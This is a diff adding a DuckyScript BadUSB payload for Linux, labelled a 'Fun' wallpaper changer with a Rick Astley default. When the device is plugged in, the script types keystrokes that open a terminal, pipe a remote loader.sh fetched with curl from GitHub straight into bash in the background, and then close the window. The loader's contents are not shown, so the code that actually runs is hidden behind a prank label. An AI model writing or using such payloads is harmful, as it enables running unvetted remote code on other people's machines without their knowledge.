@@ -1,0 +1,22 @@
+REM ============================================================
+REM 🖼️ Wallpaper Changer - Linux
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Linux (GNOME, KDE, XFCE, etc.)
+REM Category: Fun
+REM
+REM Changes desktop wallpaper.
+REM Default: Rick Astley
+REM
+REM OPTIONAL:
+REM   Set U for custom image URL
+REM ============================================================
+DELAY 500
+CTRL ALT t
+DELAY 1500
+STRING M="wallpaper" bash -c 'curl -sL https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.sh|bash' &
+ENTER
+DELAY 500
+STRING exit
+ENTER
